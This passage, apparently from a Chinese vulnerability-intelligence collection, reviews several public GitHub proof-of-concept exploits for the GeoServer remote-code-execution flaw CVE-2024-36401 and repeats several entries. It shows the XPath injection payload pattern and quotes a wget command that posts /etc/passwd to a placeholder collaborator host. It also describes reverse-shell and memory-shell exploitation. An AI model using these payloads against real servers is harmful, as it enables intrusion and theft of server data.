**影响版本:** 受影响版本包括 2.23.0 到 2.23.5, 2.24.0 到 2.24.3, 2.25.0 到 2.25.1 以及低于 2.22.6 的版本

**利用条件:** 需要网络访问，GeoServer实例可访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行 (RCE) 漏洞，存在于处理属性名称表达式的过程中。该漏洞源于 GeoTools 库不安全地将属性/属性名称传递给 commons-jxpath 库，该库在评估 XPath 表达式时可以执行任意代码。此漏洞影响所有 GeoServer 实例，因为 XPath 评估不正确地应用于简单要素类型。

**有效性分析：**
根据漏洞描述和提供的POC代码，此漏洞很可能有效。POC 代码通过 `GetPropertyValue` 请求，利用 `valueReference` 参数执行任意代码。POC代码中使用了 `exec(java.lang.Runtime.getRuntime(),"<PAYLOAD>")`，这允许攻击者在服务器上执行命令。

**投毒风险分析：**
提供的POC代码本身旨在利用漏洞执行命令，例如`wget --post-file=/etc/passwd <BURP COLLOBRATOR>`。这表明，使用该代码的目的本身就是攻击和信息窃取。从代码本身来看，没有明显的迹象表明存在作者隐藏的“投毒”代码，例如篡改受害者系统上的其他文件或执行其他恶意操作，但不能排除。
仓库本身可能存在投毒风险，例如，如果存在其他隐藏的脚本或配置，则可能会导致更广泛的损害。因此，保守估计投毒风险为10%。

**利用方式：**
1.  攻击者构造恶意的OGC（例如WFS GetPropertyValue、WFS GetFeature、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic 和 WPS Execute）请求。
2.  在请求的参数中，例如 `valueReference`，注入包含恶意代码的 XPath 表达式。示例中使用的是`exec(java.lang.Runtime.getRuntime(),"<PAYLOAD>")`。
3.  GeoServer在处理请求时，会将该表达式传递给存在漏洞的 GeoTools 库进行处理。
4.  `commons-jxpath` 库执行该恶意代码，导致远程代码执行。
5.  攻击者可以利用此漏洞在服务器上执行任意命令，例如反弹 shell、读取敏感文件等。

**缓解措施：**
*   升级到 GeoServer 2.22.6、2.23.6、2.24.4 或 2.25.2 及以上版本。
*   作为临时解决方案，可以从 GeoServer 中删除 `gt-complex-x.y.jar` 文件，但这可能会影响某些功能。

**项目地址:** [punitdarji/GeoServer-CVE-2024-36401](https://github.com/punitdarji/GeoServer-CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #21

**来源**: [CVE-2024-36401-thestar0_CVE-2024-36401-WoodpeckerPlugin.md](../2024/CVE-2024-36401-thestar0_CVE-2024-36401-WoodpeckerPlugin.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** < 2.22.6, >= 2.23.0 < 2.23.6, >= 2.24.0 < 2.24.4, >= 2.25.0 < 2.25.2

**利用条件:** 默认GeoServer安装，可通过WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute请求进行利用

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401是GeoServer中的一个远程代码执行漏洞，由于GeoTools库不安全地将属性名称作为XPath表达式传递给commons-jxpath库导致的。未经身份验证的攻击者可以利用此漏洞通过构造恶意的OGC请求来执行任意代码。

**有效性：**

根据漏洞库信息和搜索结果，该漏洞已在野外被利用，并且存在公开的POC。提供的漏洞利用代码是一个Woodpecker插件，它支持批量探测和利用该漏洞，包括执行任意命令和注入内存马。该插件使用Java编写，并且提供了详细的使用说明，表明其有效性较高。

**投毒风险：**

该代码主要功能是漏洞利用，内存马注入，但是自定义内存马部分存在风险,如果被替换成恶意代码，可能存在投毒行为，因此风险为10%。

**利用方式：**

1.  **漏洞触发：** 攻击者通过构造恶意的OGC请求（例如WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute请求），将恶意XPath表达式传递给GeoServer。
2.  **XPath注入：** GeoServer使用GeoTools库处理OGC请求中的属性名称。GeoTools库不安全地将这些属性名称传递给commons-jxpath库进行处理。
3.  **代码执行：** commons-jxpath库将恶意XPath表达式作为代码执行，导致远程代码执行。
4.  **内存马注入（可选）：** 攻击者可以使用该漏洞注入内存马，以便在目标服务器上持久化控制。

**总结：** CVE-2024-36401是一个高危的远程代码执行漏洞，易于利用且影响广泛。建议受影响的用户尽快升级到安全版本或采取缓解措施（例如删除`gt-complex-x.y.jar`文件）。提供的POC代码可以有效利用该漏洞，但也应谨慎使用，以避免潜在的恶意代码风险。

**项目地址:** [thestar0/CVE-2024-36401-WoodpeckerPlugin](https://github.com/thestar0/CVE-2024-36401-WoodpeckerPlugin)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #22

**来源**: [CVE-2024-36401-whitebear-ch_GeoServerExploit.md](../2024/CVE-2024-36401-whitebear-ch_GeoServerExploit.md)

## CVE-2024-36401 - GeoServer RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 严重，未经身份验证的攻击者可以执行任意代码。

**影响版本:** 受影响版本包括 2.22.6 之前的所有版本，2.23.0 <= version < 2.23.6, 2.24.0 <= version < 2.24.4, 2.25.0 <= version < 2.25.2

**利用条件:** 默认 GeoServer 安装，需要网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 存在于 GeoServer 中，由于 GeoTools 库不安全地将属性名称作为 XPath 表达式传递给 commons-jxpath 库，导致未经身份验证的用户可以通过构造特定的 OGC 请求参数（如 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute）执行任意代码。

根据漏洞库信息和搜索结果，此漏洞利用已被积极利用。提供的漏洞利用代码（GeoServerExploit）表明已经存在可用的 PoC。

投毒风险分析：提供的漏洞利用代码仅包含 README.md 文件，展示了工具的使用示例和致谢信息。虽然从单个 README.md 文件无法完全判断是否存在投毒代码，但考虑到这是一个漏洞利用工具，仍有小概率（10%）存在作者隐藏的恶意代码或其他未公开的利用方式。需要检查完整的项目代码才能更准确地评估投毒风险。

利用方式总结：攻击者通过构造恶意的 OGC 请求，利用 commons-jxpath 库执行任意 XPath 表达式，从而实现远程代码执行。

**项目地址:** [whitebear-ch/GeoServerExploit](https://github.com/whitebear-ch/GeoServerExploit)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #23

**来源**: [CVE-2024-36401-yisas93_CVE-2024-36401-PoC.md](../2024/CVE-2024-36401-yisas93_CVE-2024-36401-PoC.md)

## CVE-2024-36401-GeoServer-远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，允许未授权的远程代码执行

**影响版本:** 2.23.0 < 2.23.6, 2.24.0 < 2.24.4, 2.25.0 < 2.25.2, < 2.22.6

**利用条件:** GeoServer实例需要能够处理WFS GetPropertyValue等OGC请求

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行漏洞，该漏洞源于 GeoTools 库 API 不安全地将属性名称传递给 commons-jxpath 库，从而允许执行任意代码。PoC 代码通过构造 WFS GetPropertyValue 请求，利用 XPath 表达式注入来执行恶意命令。该 PoC 包含一个 Python 脚本 (exploit.py) 和一个类型名称列表 (type_names.txt)。脚本首先在攻击者主机上启动一个反向 shell 监听器，然后将反向 shell 命令进行 Base64 编码，最后通过特制的 WFS GetPropertyValue 请求发送到目标 GeoServer 实例。如果成功，GeoServer 将执行该命令，并将反向 shell 连接回攻击者主机。

**有效性：**

根据漏洞描述和搜索结果，该漏洞在野外已被利用，PoC代码是有效的。

**投毒风险：**

分析提供的 PoC 代码，未发现明显的恶意代码或后门。代码功能清晰，主要用于利用漏洞执行远程命令。`type_names.txt` 文件包含 GeoServer 已知类型名称列表，用于构造请求，本身不构成安全风险。`exploit.py` 脚本的功能是生成反向 shell 命令，对其进行编码，并通过构造的 WFS GetPropertyValue 请求发送它。不存在隐藏的恶意功能。

**利用方式：**

1.  攻击者需要一台能够建立网络连接的主机。
2.  攻击者运行 PoC 脚本，指定目标 GeoServer URL，以及反向 shell 的 IP 地址和端口。
3.  PoC 脚本构造包含恶意 XPath 表达式的 WFS GetPropertyValue 请求，其中 XPath 表达式注入了反向 shell 命令。
4.  GeoServer 在处理请求时，由于漏洞，会执行该恶意命令。
5.  攻击者主机收到来自 GeoServer 实例的反向 shell 连接，从而获得对服务器的控制。

总的来说，提供的PoC没有发现有投毒代码，主要通过java.lang.Runtime.getRuntime()执行命令。

**项目地址:** [yisas93/CVE-2024-36401-PoC](https://github.com/yisas93/CVE-2024-36401-PoC)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---



---

## POC #16

**来源**: [CVE-2024-36401-justin-p_geoexplorer.md](../2024/CVE-2024-36401-justin-p_geoexplorer.md)

## CVE-2024-36401 - GeoServer远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 严重，未授权的远程代码执行

**影响版本:** 受影响版本包括 2.23.0 到 2.23.6，2.24.0 到 2.24.4，2.25.0 到 2.25.2，以及低于 2.22.6 的版本。

**利用条件:** 默认 GeoServer 安装，网络可访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行漏洞，由于 GeoTools 库 API 不安全地将属性名称作为 XPath 表达式传递给 commons-jxpath 库，导致攻击者可以通过构造特定的 OGC 请求（如 WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic 和 WPS Execute）来执行任意代码。漏洞利用通过修改property/attribute，使之成为恶意的xpath表达式，触发commons-jxpath执行代码。提供的 PoC 代码 `GeoExplorer` 旨在扫描 GeoServer 实例并利用此漏洞。 

**有效性：**

根据漏洞库信息、搜索结果以及提供的 PoC 代码，此漏洞是有效的并且已被积极利用。搜索结果中多个链接表明该漏洞已被公开披露，并且有威胁情报报告指出该漏洞已被恶意利用。

**投毒风险：**

分析提供的 PoC 代码，主要的投毒风险在于：

1.  **Catcher URL:** `client/main.py` 脚本中使用了 `-c` 参数指定 catcher URL，用于接收被利用的服务器的回调。攻击者可以控制这个 URL，将受害者重定向到恶意站点或者收集敏感信息。虽然默认值指向本地地址，但用户如果配置不当，则存在风险。
2.  **wget Payload:**  PoC 使用 `wget` 作为 payload，这本身存在一定风险。虽然 `wget` 通常用于下载文件，但恶意用户可能会利用它执行其他恶意操作。例如，下载并执行一个 shell 脚本。
3. **依赖风险:** 该POC依赖requests, argparse, urllib3等第三方库，如果作者上传了包含恶意代码的软件包到Pypi，存在一定的供应链风险.

综合分析，PoC 代码本身主要用于漏洞验证和利用，但如果使用者不小心配置或被中间人攻击替换catcher URL，则可能存在一定投毒风险。假设用户会检查和修改 catcher URL，并从官方源安装依赖，因此评估投毒风险为10%。

**利用方式：**

1.  **扫描目标：** 使用 PoC 客户端扫描存在漏洞的 GeoServer 实例。
2.  **发现FeatureType：** 利用`ListStoredQueries` request on WFS 获取feature type
3.  **构造恶意请求：** PoC 通过构造包含恶意 XPath 表达式的 OGC 请求，例如 WFS GetFeature 请求，来触发漏洞。XPath 表达式注入到 property/attribute name 中。
4.  **远程代码执行：** GeoServer 解析请求时，`commons-jxpath` 库会执行恶意 XPath 表达式，从而导致远程代码执行。
5.  **回调：**  被利用的服务器通过 `wget` 向指定的 catcher URL 发送请求，表明漏洞利用成功。

**项目地址:** [justin-p/geoexplorer](https://github.com/justin-p/geoexplorer)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #17

**来源**: [CVE-2024-36401-kkhackz0013_CVE-2024-36401.md](../2024/CVE-2024-36401-kkhackz0013_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行（RCE）

**影响应用:** GeoServer

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** 2.22.x (<2.22.6), 2.23.x (>=2.23.0 <2.23.6), 2.24.x (>=2.24.0 <2.24.4), 2.25.x (>=2.25.0 <2.25.2)

**利用条件:** 默认 GeoServer 安装，可通过网络访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-36401 允许未经身份验证的用户通过构造特制的 OGC 请求来执行远程代码。漏洞原因是 GeoServer 使用的 GeoTools 库不安全地将属性名称作为 XPath 表达式进行评估。攻击者可以通过 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求来利用此漏洞。

提供的POC代码 `CVE-2024-36401.py` 通过发送特制的 WFS GetPropertyValue 请求来利用漏洞。该请求包含一个 `valueReference` 参数，其中包含一个 `exec` 函数，该函数允许执行任意命令。默认POC代码使用 `nc` 命令来反弹 shell。代码中未发现明显的投毒行为。

利用方式：

1.  攻击者向存在漏洞的 GeoServer 实例发送特制的 WFS GetPropertyValue 请求。
2.  请求中的 `valueReference` 参数包含要执行的恶意代码。
3.  GeoServer 将 `valueReference` 中的属性名称传递给 commons-jxpath 库进行评估。
4.  commons-jxpath 库执行恶意代码，导致远程代码执行。

根据搜索引擎结果，此漏洞已经被积极利用，因此POC的有效性非常高。

综上，该POC有效，且未发现明显的投毒风险。利用方式清晰，风险等级为严重。

**项目地址:** [kkhackz0013/CVE-2024-36401](https://github.com/kkhackz0013/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #18

**来源**: [CVE-2024-36401-lowsuet_CVE-2024-36401.md](../2024/CVE-2024-36401-lowsuet_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 2.22.x < 2.22.6, 2.23.x < 2.23.6, 2.24.x < 2.24.4, 2.25.x < 2.25.2

**利用条件:** 目标GeoServer实例在受影响版本范围内，且允许外部网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是一个 GeoServer 中的远程代码执行漏洞，源于 GeoTools 库在处理要素类型属性名称时，不安全地将其传递给 commons-jxpath 库，导致在评估 XPath 表达式时可以执行任意代码。该漏洞影响所有 GeoServer 实例，无需身份验证即可利用。攻击者可以通过构造恶意的 WFS GetPropertyValue 请求，在目标服务器上执行任意命令。

**漏洞利用方式：**

1.  攻击者构造包含恶意 XPath 表达式的 WFS GetPropertyValue 请求。
2.  GeoServer 将属性名称传递给 commons-jxpath 库进行评估。
3.  commons-jxpath 库执行恶意 XPath 表达式，导致远程代码执行。

根据提供的漏洞利用代码，该 POC 使用 Go 语言编写，提供了一个图形化界面，允许用户指定目标 GeoServer URL 和要执行的命令，可以通过设置代理访问目标。该POC 代码通过构造恶意的`wfs:GetPropertyValue`请求，将命令传递给目标服务器执行。代码中使用了 `java.lang.Runtime.getRuntime()` 来执行命令，confirm 该方法是漏洞利用的关键。

**投毒风险分析：**

*   代码中存在网络请求功能，允许从远程服务器获取资源，增加了潜在的投毒风险。
*   代码中存在执行系统命令的功能，如果被篡改，可能被用于执行恶意操作。
*   虽然代码主要功能是利用漏洞，但如果作者植入恶意代码（例如，反弹 Shell 或下载执行恶意程序），则可能在使用者不知情的情况下感染目标系统。

考虑到以上风险，给与10%的投毒风险，请使用者在运行前仔细检查代码逻辑。

**项目地址:** [lowsuet/CVE-2024-36401](https://github.com/lowsuet/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #19

**来源**: [CVE-2024-36401-netuseradministrator_CVE-2024-36401.md](../2024/CVE-2024-36401-netuseradministrator_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 2.22.6之前, 2.23.0 - 2.23.6, 2.24.0 - 2.24.4, 2.25.0 - 2.25.2

**利用条件:** 需要网络访问，GeoServer实例运行在受影响的版本上

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 存在于 GeoServer 中，由于不安全地将属性名称作为 XPath 表达式进行评估，导致未经身份验证的用户可以通过构造的输入执行远程代码。该漏洞利用了 GeoTools 库 API 对要素类型属性名称的处理方式，使其能够被传递到 commons-jxpath 库并执行任意代码。漏洞利用代码提供了一个图形化界面，允许用户指定目标 URL 和要执行的命令。它构造一个恶意的 WFS GetPropertyValue 请求，其中 valueReference 属性包含一个执行命令的表达式 (例如, `exec(java.lang.Runtime.getRuntime(),"command")`)。然后，通过 HTTP POST 请求将该请求发送到目标 GeoServer 实例。漏洞利用代码还包括代理设置功能，允许用户通过代理服务器发送请求。该漏洞可以通过 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求触发。

**投毒风险分析：**

代码中存在一定程度的投毒风险的可能性（约10%），主要体现在以下几个方面：

*   **依赖项：** `go.mod` 文件中存在一些第三方依赖项，例如 `fyne.io/fyne/v2` 用于图形界面。虽然这些依赖项本身是常用的，但它们可能会引入潜在的安全漏洞或后门，尤其是在构建过程中。
*   **图形界面：** 图形界面本身可能存在安全问题，例如，如果界面中的某些组件没有得到正确的安全处理，攻击者可能会利用这些组件来执行恶意代码。
*   **网络请求：** 代码中包含发起 HTTP 请求的代码。如果攻击者能够控制这些请求的内容，他们可能会利用这些请求来执行恶意操作。但是考虑到此项目是为了进行漏洞利用测试,因此远程请求是免不了的.
*   **内存马注入功能:** 代码声明包含内存马注入功能,虽然是为了漏洞利用,但也存在风险,可能被滥用。
*   **免责声明缺失:** 仓库中缺少明确的免责声明，可能导致使用者在未充分了解风险的情况下使用该工具，从而承担不必要的法律责任。

综上所述，该仓库中存在一定程度的投毒风险，但总体来说风险较低。使用者在使用该工具时应保持警惕，并仔细审查代码，以确保其安全性。

**项目地址:** [netuseradministrator/CVE-2024-36401](https://github.com/netuseradministrator/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #20

**来源**: [CVE-2024-36401-punitdarji_GeoServer-CVE-2024-36401.md](../2024/CVE-2024-36401-punitdarji_GeoServer-CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，允许未经身份验证的用户执行任意代码

**影响版本:** 受影响版本包括 2.23.0 到 2.23.5, 2.24.0 到 2.24.3, 2.25.0 到 2.25.1 以及低于 2.22.6 的版本

**利用条件:** 需要网络访问，GeoServer实例可访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行 (RCE) 漏洞，存在于处理属性名称表达式的过程中。该漏洞源于 GeoTools 库不安全地将属性/属性名称传递给 commons-jxpath 库，该库在评估 XPath 表达式时可以执行任意代码。此漏洞影响所有 GeoServer 实例，因为 XPath 评估不正确地应用于简单要素类型。

**有效性分析：**
根据漏洞描述和提供的POC代码，此漏洞很可能有效。POC 代码通过 `GetPropertyValue` 请求，利用 `valueReference` 参数执行任意代码。POC代码中使用了 `exec(java.lang.Runtime.getRuntime(),"<PAYLOAD>")`，这允许攻击者在服务器上执行命令。

**投毒风险分析：**
提供的POC代码本身旨在利用漏洞执行命令，例如`wget --post-file=/etc/passwd <BURP COLLOBRATOR>`。这表明，使用该代码的目的本身就是攻击和信息窃取。从代码本身来看，没有明显的迹象表明存在作者隐藏的“投毒”代码，例如篡改受害者系统上的其他文件或执行其他恶意操作，但不能排除。
仓库本身可能存在投毒风险，例如，如果存在其他隐藏的脚本或配置，则可能会导致更广泛的损害。因此，保守估计投毒风险为10%。

**利用方式：**
1.  攻击者构造恶意的OGC（例如WFS GetPropertyValue、WFS GetFeature、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic 和 WPS Execute）请求。
2.  在请求的参数中，例如 `valueReference`，注入包含恶意代码的 XPath 表达式。示例中使用的是`exec(java.lang.Runtime.getRuntime(),"<PAYLOAD>")`。
3.  GeoServer在处理请求时，会将该表达式传递给存在漏洞的 GeoTools 库进行处理。
4.  `commons-jxpath` 库执行该恶意代码，导致远程代码执行。
5.  攻击者可以利用此漏洞在服务器上执行任意命令，例如反弹 shell、读取敏感文件等。

**缓解措施：**
*   升级到 GeoServer 2.22.6、2.23.6、2.24.4 或 2.25.2 及以上版本。
*   作为临时解决方案，可以从 GeoServer 中删除 `gt-complex-x.y.jar` 文件，但这可能会影响某些功能。

**项目地址:** [punitdarji/GeoServer-CVE-2024-36401](https://github.com/punitdarji/GeoServer-CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #21

**来源**: [CVE-2024-36401-thestar0_CVE-2024-36401-WoodpeckerPlugin.md](../2024/CVE-2024-36401-thestar0_CVE-2024-36401-WoodpeckerPlugin.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** < 2.22.6, >= 2.23.0 < 2.23.6, >= 2.24.0 < 2.24.4, >= 2.25.0 < 2.25.2

**利用条件:** 默认GeoServer安装，可通过WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute请求进行利用

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401是GeoServer中的一个远程代码执行漏洞，由于GeoTools库不安全地将属性名称作为XPath表达式传递给commons-jxpath库导致的。未经身份验证的攻击者可以利用此漏洞通过构造恶意的OGC请求来执行任意代码。

**有效性：**

根据漏洞库信息和搜索结果，该漏洞已在野外被利用，并且存在公开的POC。提供的漏洞利用代码是一个Woodpecker插件，它支持批量探测和利用该漏洞，包括执行任意命令和注入内存马。该插件使用Java编写，并且提供了详细的使用说明，表明其有效性较高。

**投毒风险：**

该代码主要功能是漏洞利用，内存马注入，但是自定义内存马部分存在风险,如果被替换成恶意代码，可能存在投毒行为，因此风险为10%。

**利用方式：**

1.  **漏洞触发：** 攻击者通过构造恶意的OGC请求（例如WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute请求），将恶意XPath表达式传递给GeoServer。
2.  **XPath注入：** GeoServer使用GeoTools库处理OGC请求中的属性名称。GeoTools库不安全地将这些属性名称传递给commons-jxpath库进行处理。
3.  **代码执行：** commons-jxpath库将恶意XPath表达式作为代码执行，导致远程代码执行。
4.  **内存马注入（可选）：** 攻击者可以使用该漏洞注入内存马，以便在目标服务器上持久化控制。

**总结：** CVE-2024-36401是一个高危的远程代码执行漏洞，易于利用且影响广泛。建议受影响的用户尽快升级到安全版本或采取缓解措施（例如删除`gt-complex-x.y.jar`文件）。提供的POC代码可以有效利用该漏洞，但也应谨慎使用，以避免潜在的恶意代码风险。

**项目地址:** [thestar0/CVE-2024-36401-WoodpeckerPlugin](https://github.com/thestar0/CVE-2024-36401-WoodpeckerPlugin)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #22

**来源**: [CVE-2024-36401-whitebear-ch_GeoServerExploit.md](../2024/CVE-2024-36401-whitebear-ch_GeoServerExploit.md)

## CVE-2024-36401 - GeoServer RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 严重，未经身份验证的攻击者可以执行任意代码。

**影响版本:** 受影响版本包括 2.22.6 之前的所有版本，2.23.0 <= version < 2.23.6, 2.24.0 <= version < 2.24.4, 2.25.0 <= version < 2.25.2

**利用条件:** 默认 GeoServer 安装，需要网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 存在于 GeoServer 中，由于 GeoTools 库不安全地将属性名称作为 XPath 表达式传递给 commons-jxpath 库，导致未经身份验证的用户可以通过构造特定的 OGC 请求参数（如 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute）执行任意代码。

根据漏洞库信息和搜索结果，此漏洞利用已被积极利用。提供的漏洞利用代码（GeoServerExploit）表明已经存在可用的 PoC。

投毒风险分析：提供的漏洞利用代码仅包含 README.md 文件，展示了工具的使用示例和致谢信息。虽然从单个 README.md 文件无法完全判断是否存在投毒代码，但考虑到这是一个漏洞利用工具，仍有小概率（10%）存在作者隐藏的恶意代码或其他未公开的利用方式。需要检查完整的项目代码才能更准确地评估投毒风险。

利用方式总结：攻击者通过构造恶意的 OGC 请求，利用 commons-jxpath 库执行任意 XPath 表达式，从而实现远程代码执行。

**项目地址:** [whitebear-ch/GeoServerExploit](https://github.com/whitebear-ch/GeoServerExploit)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #23

**来源**: [CVE-2024-36401-yisas93_CVE-2024-36401-PoC.md](../2024/CVE-2024-36401-yisas93_CVE-2024-36401-PoC.md)

## CVE-2024-36401-GeoServer-远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，允许未授权的远程代码执行

**影响版本:** 2.23.0 < 2.23.6, 2.24.0 < 2.24.4, 2.25.0 < 2.25.2, < 2.22.6

**利用条件:** GeoServer实例需要能够处理WFS GetPropertyValue等OGC请求

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行漏洞，该漏洞源于 GeoTools 库 API 不安全地将属性名称传递给 commons-jxpath 库，从而允许执行任意代码。PoC 代码通过构造 WFS GetPropertyValue 请求，利用 XPath 表达式注入来执行恶意命令。该 PoC 包含一个 Python 脚本 (exploit.py) 和一个类型名称列表 (type_names.txt)。脚本首先在攻击者主机上启动一个反向 shell 监听器，然后将反向 shell 命令进行 Base64 编码，最后通过特制的 WFS GetPropertyValue 请求发送到目标 GeoServer 实例。如果成功，GeoServer 将执行该命令，并将反向 shell 连接回攻击者主机。

**有效性：**

根据漏洞描述和搜索结果，该漏洞在野外已被利用，PoC代码是有效的。

**投毒风险：**

分析提供的 PoC 代码，未发现明显的恶意代码或后门。代码功能清晰，主要用于利用漏洞执行远程命令。`type_names.txt` 文件包含 GeoServer 已知类型名称列表，用于构造请求，本身不构成安全风险。`exploit.py` 脚本的功能是生成反向 shell 命令，对其进行编码，并通过构造的 WFS GetPropertyValue 请求发送它。不存在隐藏的恶意功能。

**利用方式：**

1.  攻击者需要一台能够建立网络连接的主机。
2.  攻击者运行 PoC 脚本，指定目标 GeoServer URL，以及反向 shell 的 IP 地址和端口。
3.  PoC 脚本构造包含恶意 XPath 表达式的 WFS GetPropertyValue 请求，其中 XPath 表达式注入了反向 shell 命令。
4.  GeoServer 在处理请求时，由于漏洞，会执行该恶意命令。
5.  攻击者主机收到来自 GeoServer 实例的反向 shell 连接，从而获得对服务器的控制。

总的来说，提供的PoC没有发现有投毒代码，主要通过java.lang.Runtime.getRuntime()执行命令。

**项目地址:** [yisas93/CVE-2024-36401-PoC](https://github.com/yisas93/CVE-2024-36401-PoC)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---



---

## POC #16

**来源**: [CVE-2024-36401-justin-p_geoexplorer.md](../2024/CVE-2024-36401-justin-p_geoexplorer.md)

## CVE-2024-36401 - GeoServer远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 严重，未授权的远程代码执行

**影响版本:** 受影响版本包括 2.23.0 到 2.23.6，2.24.0 到 2.24.4，2.25.0 到 2.25.2，以及低于 2.22.6 的版本。

**利用条件:** 默认 GeoServer 安装，网络可访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行漏洞，由于 GeoTools 库 API 不安全地将属性名称作为 XPath 表达式传递给 commons-jxpath 库，导致攻击者可以通过构造特定的 OGC 请求（如 WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic 和 WPS Execute）来执行任意代码。漏洞利用通过修改property/attribute，使之成为恶意的xpath表达式，触发commons-jxpath执行代码。提供的 PoC 代码 `GeoExplorer` 旨在扫描 GeoServer 实例并利用此漏洞。 

**有效性：**

根据漏洞库信息、搜索结果以及提供的 PoC 代码，此漏洞是有效的并且已被积极利用。搜索结果中多个链接表明该漏洞已被公开披露，并且有威胁情报报告指出该漏洞已被恶意利用。

**投毒风险：**

分析提供的 PoC 代码，主要的投毒风险在于：

1.  **Catcher URL:** `client/main.py` 脚本中使用了 `-c` 参数指定 catcher URL，用于接收被利用的服务器的回调。攻击者可以控制这个 URL，将受害者重定向到恶意站点或者收集敏感信息。虽然默认值指向本地地址，但用户如果配置不当，则存在风险。
